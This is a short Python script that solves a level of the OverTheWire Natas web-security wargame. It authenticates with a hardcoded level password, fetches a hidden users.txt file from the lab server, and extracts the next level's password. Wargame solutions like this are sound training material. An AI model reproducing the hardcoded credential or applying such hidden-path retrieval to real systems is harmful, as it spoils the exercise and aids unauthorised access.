import requests
import re
import colorama
from colorama import Fore, Style

colorama.init(autoreset=False)
print(Fore.LIGHTBLUE_EX, Style.BRIGHT)

username = 'natas3'
password = 'G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q'

url = f'http://{username}.natas.labs.overthewire.org/s3cr3t/users.txt'

resp = requests.get(url=url, auth=(username, password))

print(f"Natas4: {re.findall('natas4:(.*)', resp.text)[0]}")



